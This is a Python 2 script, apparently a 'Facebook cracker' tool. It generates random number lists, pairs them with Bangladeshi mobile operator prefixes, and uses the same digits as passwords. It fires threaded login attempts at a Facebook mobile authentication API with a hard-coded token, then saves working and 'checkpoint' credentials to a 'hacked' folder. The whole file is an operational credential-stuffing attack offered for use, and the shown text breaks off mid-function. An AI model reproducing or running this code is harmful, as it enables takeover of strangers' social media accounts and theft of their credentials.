#!/usr/bin/python2
# -*- coding: UTF-8 -*-.

R = '\033[1;91m'
G = '\033[1;92m'
Y = '\033[1;93m'
P = '\033[1;95m'
C = '\033[1;96m'
W = '\033[1;97m'
RE = '\x1b[0m'

import re
import os
import sys
import time
import json
import random
import urllib
import getpass
import hashlib
import datetime
import threading
import cookielib
from os import system
from time import sleep

system('rm -rf .num')
for n in range(50000):
    nmbr = random.randint(11111111, 99999999)
    sys.stdout = open('.num', 'a')
    print(nmbr)
    sys.stdout.flush()

system('rm -rf .tmp')
for n in range(50000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.tmp', 'a')
    print(nmbr)
    sys.stdout.flush()

try:
    import requests
except ImportError:
    system('pip2 install requests > /dev/null 2>&1 &')
    system('pip2 install requests > /dev/null 2>&1 &')

try:
    import mechanize
except ImportError:
    system('pip2 install mechanize > /dev/null 2>&1 &')
    system('pip2 install mechanize > /dev/null 2>&1 &')

try:
    import requests
except ImportError:
    print('\nUnable to Install requests !')
    os.sys.exit()

try:
    import mechanize
except ImportError:
    print('\nUnable to Install mechanize !')
    os.sys.exit()

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
# br.addheaders = [('user-agent','Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]')]
br.addheaders = [('user-agent','Mozilla/5.0 (Linux; Android 9; SM-A102U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/270.1.0.66.127;]')]


def htrprint(s):
	for t in s + '\n':
		sys.stdout.write(t)
		sys.stdout.flush()
		sleep(0.01)

def exithr():
    print
    htrprint('\033[1;93m Thank You for using this tool\x1b[0m')
    print
    sleep(1)
    system('rm -rf .num .tmp')
    os.sys.exit()

logo="""
\033[1;96m
 o--o    O  o  o 
 |   |  / \ | /  
 O--o  o---oOO   
 |     |   || \  
 o     o   oo  o 
\033[1;95m
  ____  ____  ____  ____  ____  ____ 
 ||a ||||c ||||o ||||u ||||n ||||t ||
 ||__||||__||||__||||__||||__||||__||
 |/__\||/__\||/__\||/__\||/__\||/__\|
 
\033[1;34m
 ____ _    ____ _  _ ____ ____ 
 |    |    |  | |\ | |___ |__/ 
 |___ |___ |__| | \| |___ |  \ 
ЁТИЮтЗЭтЗЭтЗЭтЗЭтЭетЭетЭетЭетЭетЭетЭетЭетЭетЭе
тЩгтЩгтШГтДЫ┬гр╣Ц█г█г█ЬDЁУД┐╨йс╢РЁЯЕ╡ЁЯЕ╕тЩгтЩг
тЩетЩетЭдтЭдтЭдЁЯТЛтЭдтЩетЩетЭдтЭд
"""
back = 0
htrb = []
htrk = []
id = []

#----- Main Menu ------#

def cra3kmenu():
    system("clear")
    print (logo)
    htrprint ("\033[1;91m [\033[1;93m01\033[1;91m]\033[1;92m 7 DIGIT CRACKER \n\033[1;91m [\033[1;93m02\033[1;91m]\033[1;92m 8 DIGIT CRACKER \n\033[1;91m [\033[1;93m03\033[1;91m]\033[1;92m 9 DIGIT CRACKER \n\033[1;91m [\033[1;93m04\033[1;91m]\033[1;92m 10 DIGIT CRACKER \n\033[1;91m [\033[1;93m05\033[1;91m]\033[1;92m 11 DIGIT CRACKER \n\033[1;91m [\033[1;93m06\033[1;91m]\033[1;92m More Tools \n\033[1;91m [\033[1;93m07\033[1;91m]\033[1;92m Find me on \n\033[1;91m [\033[1;93m00\033[1;91m]\033[1;92m Exit \n")
    menuhaxor()
    
def menuhaxor():
    htrmen = raw_input('\033[1;96m Select an Option \033[1;97m:\033[1;93m ')
    if htrmen =='':
        print '\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Invalid command \033[1;91m[\033[1;93m!\033[1;91m]\n'
        sleep(1)
        cra3kmenu()
    elif htrmen =="1" or htrmen =="01":
        try:
            system('rm -rf .num')
            system('mv -f .tmp .num')
            crackseven()
        except IOError:
            print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
            sleep(1)
            cra3kmenu()
    elif htrmen =="2" or htrmen =="02":
        try:
            system('rm -rf .tmp')
            crackeight()
        except IOError:
            print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
            sleep(1)
            cra3kmenu()
    elif htrmen =="3" or htrmen =="03":
        try:
            system('rm -rf .tmp')
            cracknine()
        except IOError:
            print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
            sleep(1)
            cra3kmenu()
    elif htrmen =="4" or htrmen =="04":
        try:
            system('rm -rf .tmp')
            crackten()
        except IOError:
            print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
            sleep(1)
            cra3kmenu()
    elif htrmen =="5" or htrmen =="05":
        try:
            system('rm -rf .tmp')
            crackelv()
        except IOError:
            print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
            sleep(1)
            cra3kmenu()
    elif htrmen =="6" or htrmen =="06":
        sleep(1)
        cra3kmenu()
    elif htrmen =="7" or htrmen =="07":
        sleep(1)
        cra3kmenu()
    elif htrmen =='0' or htrmen =="00":
        system('rm -rf .num .tmp')
        sleep(1)
        exithr()
    else:
        print '\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Invalid command \033[1;91m[\033[1;93m!\033[1;91m]\n'
        cra3kmenu()

#---- 7 DIGIT -----#

def crackseven():
	system('clear')
	htrprint (logo)
	print("\033[1;91m[\033[1;93m01\033[1;91m]\033[1;92m Grameenphone \n\033[1;91m[\033[1;93m02\033[1;91m]\033[1;92m Grameenphone \033[1;91m[\033[1;93m Mirror \033[1;91m]\033[0m \n\033[1;91m[\033[1;93m03\033[1;91m]\033[1;92m Banglalink \n\033[1;91m[\033[1;93m04\033[1;91m]\033[1;92m Banglalink \033[1;91m[\033[1;93m Mirror \033[1;91m]\033[0m \n\033[1;91m[\033[1;93m05\033[1;91m]\033[1;92m Teletalk \n\033[1;91m[\033[1;93m06\033[1;91m]\033[1;92m Airtel \n\033[1;91m[\033[1;93m07\033[1;91m]\033[1;92m Robi \n\033[1;91m[\033[1;93m08\033[1;91m]\033[1;92m Follow Me \n\033[1;91m[\033[1;93m00\033[1;91m]\033[1;92m Exit \n")
	cr3krseven()

def cr3krseven():
	crkseven = raw_input('\033[1;96m Select an Option \033[1;97m:\033[1;93m ')
	if crkseven =='':
		print '\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Invalid command \033[1;91m[\033[1;93m!\033[1;91m]\n'
		crackseven()
	elif crkseven =="1" or crkseven =="01":
		system("clear")
		print (logo)
		print("  0, 1, 2, 3, 4, 5, 6, 7, 8, 9\n")
		try:
			c = raw_input("\033[1;96m  Select a Number : ")
			k="+88017"
			system("clear")
			print (logo)
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackseven()
	elif crkseven =="2" or crkseven =="02":
		system("clear")
		print (logo)
		print("  0, 1, 2, 3, 4, 5, 6, 7, 8, 9\n")
		try:
			c = raw_input("\033[1;96m  Select a Number : ")
			k="+88013"
			system("clear")
			print (logo)
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackseven()
	elif crkseven =="3" or crkseven =="03":
		system("clear")
		print (logo)
		print("  0, 1, 2, 3, 4, 5, 6, 7, 8, 9\n")
		try:
			c = raw_input("\033[1;96m  Select a Number : ")
			k="+88019"
			system("clear")
			print (logo)
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackseven()
	elif crkseven =="4" or crkseven =="04":
		system("clear")
		print (logo)
		print("  0, 1, 2, 3, 4, 5, 6, 7, 8, 9\n")
		try:
			c = raw_input("\033[1;96m  Select a Number : ")
			k="+88014"
			system("clear")
			print (logo)
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackseven()
	elif crkseven =="5" or crkseven =="05":
		system("clear")
		print (logo)
		print("  0, 1, 2, 3, 4, 5, 6, 7, 8, 9\n")
		try:
			c = raw_input("\033[1;96m  Select a Number : ")
			k="+88015"
			system("clear")
			print (logo)
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackseven()
	elif crkseven =="6" or crkseven =="06":
		system("clear")
		print (logo)
		print("  0, 1, 2, 3, 4, 5, 6, 7, 8, 9\n")
		try:
			c = raw_input("\033[1;96m  Select a Number : ")
			k="+88016"
			system("clear")
			print (logo)
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackseven()
	elif crkseven =="7" or crkseven =="07":
		system("clear")
		print (logo)
		print("  0, 1, 2, 3, 4, 5, 6, 7, 8, 9\n")
		try:
			c = raw_input("\033[1;96m  Select a Number : ")
			k="+88018"
			system("clear")
			print (logo)
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackseven()
	elif crkseven =='8' or crkseven =="08":
	    sleep(1)
	    crackseven()
	elif crkseven =='0' or crkseven =="00":
	    exithr()
	else:
		print '\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Invalid command \033[1;91m[\033[1;93m!\033[1;91m]\n'
		crackseven()

	xxx = str(len(id))
	htrprint ('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Total Numbers \033[1;96m:\033[1;93m '+xxx)
	htrprint ('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Process is Starting...\n')
	time.sleep(1)
	print '\x1b[36m  тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР'
	print

	def main(arg):
		global htrb,htrk
		user = arg
		try:
			os.mkdir('hacked')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '  \033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m ' + k + c + user + ' | ' + pass1+'\n'
				htrpl = open('hacked/successful.txt', 'a')
				htrpl.write(k+c+user+' | '+pass1+'\n')
				htrpl.close()
				htrk.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '  \033[1;91m[\033[1;96mCheckpoint\033[1;91m]\033[1;97m ' + k + c + user + ' | ' + pass1+'\n'
					htrp = open('hacked/checkpoint.txt', 'a')
					htrp.write(k+c+user+' | '+pass1+'\n')
					htrp.close()
					htrb.append(c+user+pass1)

		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print '\x1b[36m  тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР'
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Hacking Has Been Completed....')
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Succeed \033[1;97m|\033[1;92m Checkpoint \033[1;96m:\033[1;93m ' + str(len(htrk)) + ' \033[1;97m| \033[1;93m' + str(len(htrb)))
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;96m Data Has been Saved to " hacked "')
	print
	os.sys.exit()

#---- 8 DIGIT -----#

def crackeight():
	system('clear')
	htrprint (logo)
	print("\033[1;91m[\033[1;93m01\033[1;91m]\033[1;92m Grameenphone \n\033[1;91m[\033[1;93m02\033[1;91m]\033[1;92m Grameenphone \033[1;91m[\033[1;93m Mirror \033[1;91m]\033[0m \n\033[1;91m[\033[1;93m03\033[1;91m]\033[1;92m Banglalink \n\033[1;91m[\033[1;93m04\033[1;91m]\033[1;92m Banglalink \033[1;91m[\033[1;93m Mirror \033[1;91m]\033[0m \n\033[1;91m[\033[1;93m05\033[1;91m]\033[1;92m Teletalk \n\033[1;91m[\033[1;93m06\033[1;91m]\033[1;92m Airtel \n\033[1;91m[\033[1;93m07\033[1;91m]\033[1;92m Robi \n\033[1;91m[\033[1;93m08\033[1;91m]\033[1;92m Follow Me \n\033[1;91m[\033[1;93m00\033[1;91m]\033[1;92m Exit \n")
	cr3kreight()

def cr3kreight():
	crkeight = raw_input('\033[1;96m Select an Option \033[1;97m:\033[1;93m ')
	if crkeight =='':
		print '\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Invalid command \033[1;91m[\033[1;93m!\033[1;91m]\n'
		crackeight()
	elif crkeight =="1" or crkeight =="01":
		system("clear")
		print (logo)
		try:
			c="7"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackeight()
	elif crkeight =="2" or crkeight =="02":
		system("clear")
		print (logo)
		try:
			c="3"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackeight()
	elif crkeight =="3" or crkeight =="03":
		system("clear")
		print (logo)
		try:
			c="9"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackeight()
	elif crkeight =="4" or crkeight =="04":
		system("clear")
		print (logo)
		try:
			c="4"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackeight()
	elif crkeight =="5" or crkeight =="05":
		system("clear")
		print (logo)
		try:
			c="5"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackeight()
	elif crkeight =="6" or crkeight =="06":
		system("clear")
		print (logo)
		try:
			c="6"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackeight()
	elif crkeight =="7" or crkeight =="07":
		system("clear")
		print (logo)
		try:
			c="8"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackeight()
	elif crkeight =='8' or crkeight =="08":
	    sleep(1)
	    crackeight()
	elif crkeight =='0' or crkeight =="00":
	    exithr()
	else:
		print '\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Invalid command \033[1;91m[\033[1;93m!\033[1;91m]\n'
		crackeight()

	xxx = str(len(id))
	htrprint ('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Total Numbers \033[1;96m:\033[1;93m '+xxx)
	htrprint ('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Process is Starting...\n')
	time.sleep(1)
	print '\x1b[36m  тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР'
	print

	def main(arg):
		global htrb,htrk
		user = arg
		try:
			os.mkdir('hacked')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '  \033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m ' + k + c + user + ' | ' + pass1+'\n'
				htrpl = open('hacked/successful.txt', 'a')
				htrpl.write(k+c+user+' | '+pass1+'\n')
				htrpl.close()
				htrk.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '  \033[1;91m[\033[1;96mCheckpoint\033[1;91m]\033[1;97m ' + k + c + user + ' | ' + pass1+'\n'
					htrp = open('hacked/checkpoint.txt', 'a')
					htrp.write(k+c+user+' | '+pass1+'\n')
					htrp.close()
					htrb.append(c+user+pass1)

		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print '\x1b[36m  тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР'
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Hacking Has Been Completed....')
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Succeed \033[1;97m|\033[1;92m Checkpoint \033[1;96m:\033[1;93m ' + str(len(htrk)) + ' \033[1;97m| \033[1;93m' + str(len(htrb)))
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;96m Data Has been Saved to " hacked "')
	print
	os.sys.exit()

#---- 9 DIGIT ----#

def cracknine():
	system('clear')
	htrprint (logo)
	print("\033[1;91m[\033[1;93m01\033[1;91m]\033[1;92m Grameenphone \n\033[1;91m[\033[1;93m02\033[1;91m]\033[1;92m Grameenphone \033[1;91m[\033[1;93m Mirror \033[1;91m]\033[0m \n\033[1;91m[\033[1;93m03\033[1;91m]\033[1;92m Banglalink \n\033[1;91m[\033[1;93m04\033[1;91m]\033[1;92m Banglalink \033[1;91m[\033[1;93m Mirror \033[1;91m]\033[0m \n\033[1;91m[\033[1;93m05\033[1;91m]\033[1;92m Teletalk \n\033[1;91m[\033[1;93m06\033[1;91m]\033[1;92m Airtel \n\033[1;91m[\033[1;93m07\033[1;91m]\033[1;92m Robi \n\033[1;91m[\033[1;93m08\033[1;91m]\033[1;92m Follow Me \n\033[1;91m[\033[1;93m00\033[1;91m]\033[1;92m Exit \n")
	cr3krnine()

def cr3krnine():
	crknine = raw_input('\033[1;96m Select an Option \033[1;97m:\033[1;93m ')
	if crknine =='':
		print '\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Invalid command \033[1;91m[\033[1;93m!\033[1;91m]\n'
		cracknine()
	elif crknine =="1" or crknine =="01":
		system("clear")
		print (logo)
		try:
			c="7"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			cracknine()
	elif crknine =="2" or crknine =="02":
		system("clear")
		print (logo)
		try:
			c="3"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			cracknine()
	elif crknine =="3" or crknine =="03":
		system("clear")
		print (logo)
		try:
			c="9"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			cracknine()
	elif crknine =="4" or crknine =="04":
		system("clear")
		print (logo)
		try:
			c="4"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			cracknine()
	elif crknine =="5" or crknine =="05":
		system("clear")
		print (logo)
		try:
			c="5"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			cracknine()
	elif crknine =="6" or crknine =="06":
		system("clear")
		print (logo)
		try:
			c="6"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			cracknine()
	elif crknine =="7" or crknine =="07":
		system("clear")
		print (logo)
		try:
			c="8"
			k="+8801"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			cracknine()
	elif crknine =='8' or crknine =="08":
	    sleep(1)
	    cracknine()
	elif crknine =='0' or crknine =="00":
	    exithr()
	else:
		print '\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Invalid command \033[1;91m[\033[1;93m!\033[1;91m]\n'
		cracknine()

	xxx = str(len(id))
	htrprint ('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Total Numbers \033[1;96m:\033[1;93m '+xxx)
	htrprint ('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Process is Starting...\n')
	time.sleep(1)
	print '\x1b[36m  тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР'
	print

	def main(arg):
		global htrb,htrk
		user = arg
		try:
			os.mkdir('hacked')
		except OSError:
			pass
		try:
			pass1 = c+user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '  \033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m ' + k + c + user + ' | ' + pass1+'\n'
				htrpl = open('hacked/successful.txt', 'a')
				htrpl.write(k+c+user+' | '+pass1+'\n')
				htrpl.close()
				htrk.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '  \033[1;91m[\033[1;96mCheckpoint\033[1;91m]\033[1;97m ' + k + c + user + ' | ' + pass1+'\n'
					htrp = open('hacked/checkpoint.txt', 'a')
					htrp.write(k+c+user+' | '+pass1+'\n')
					htrp.close()
					htrb.append(c+user+pass1)

		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print '\x1b[36m  тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР'
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Hacking Has Been Completed....')
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Succeed \033[1;97m|\033[1;92m Checkpoint \033[1;96m:\033[1;93m ' + str(len(htrk)) + ' \033[1;97m| \033[1;93m' + str(len(htrb)))
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;96m Data Has been Saved to " hacked "')
	print
	os.sys.exit()

#--- 10 DIGIT ---#

def crackten():
	system('clear')
	htrprint (logo)
	print("\033[1;91m[\033[1;93m01\033[1;91m]\033[1;92m Grameenphone \n\033[1;91m[\033[1;93m02\033[1;91m]\033[1;92m Grameenphone \033[1;91m[\033[1;93m Mirror \033[1;91m]\033[0m \n\033[1;91m[\033[1;93m03\033[1;91m]\033[1;92m Banglalink \n\033[1;91m[\033[1;93m04\033[1;91m]\033[1;92m Banglalink \033[1;91m[\033[1;93m Mirror \033[1;91m]\033[0m \n\033[1;91m[\033[1;93m05\033[1;91m]\033[1;92m Teletalk \n\033[1;91m[\033[1;93m06\033[1;91m]\033[1;92m Airtel \n\033[1;91m[\033[1;93m07\033[1;91m]\033[1;92m Robi \n\033[1;91m[\033[1;93m08\033[1;91m]\033[1;92m Follow Me \n\033[1;91m[\033[1;93m00\033[1;91m]\033[1;92m Exit \n")
	cr3krten()

def cr3krten():
	crkten = raw_input('\033[1;96m Select an Option \033[1;97m:\033[1;93m ')
	if crkten =='':
		print '\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Invalid command \033[1;91m[\033[1;93m!\033[1;91m]\n'
		crackten()
	elif crkten =="1" or crkten =="01":
		system("clear")
		print (logo)
		try:
			c="17"
			k="+880"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackten()
	elif crkten =="2" or crkten =="02":
		system("clear")
		print (logo)
		try:
			c="13"
			k="+880"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackten()
	elif crkten =="3" or crkten =="03":
		system("clear")
		print (logo)
		try:
			c="19"
			k="+880"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackten()
	elif crkten =="4" or crkten =="04":
		system("clear")
		print (logo)
		try:
			c="14"
			k="+880"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackten()
	elif crkten =="5" or crkten =="05":
		system("clear")
		print (logo)
		try:
			c="15"
			k="+880"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackten()
	elif crkten =="6" or crkten =="06":
		system("clear")
		print (logo)
		try:
			c="16"
			k="+880"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
